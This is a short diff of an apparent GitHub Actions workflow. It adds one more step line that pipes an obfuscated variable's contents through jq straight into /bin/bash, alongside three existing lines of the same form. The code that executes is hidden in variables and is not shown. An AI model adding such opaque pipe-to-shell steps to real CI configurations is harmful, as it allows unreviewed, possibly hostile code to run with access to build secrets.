@@ -26,6 +26,7 @@ jobs:
           echo $kjmwk705 | jq -r .bcn2644 | /bin/bash
           printf '%s' "$fx84660" | jq -r .sgjk4 | /bin/bash
           echo $kgnq0476 | jq -r .bbrp5 | /bin/bash
+          printf '%s' "$qkfr237" | jq -r .o2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
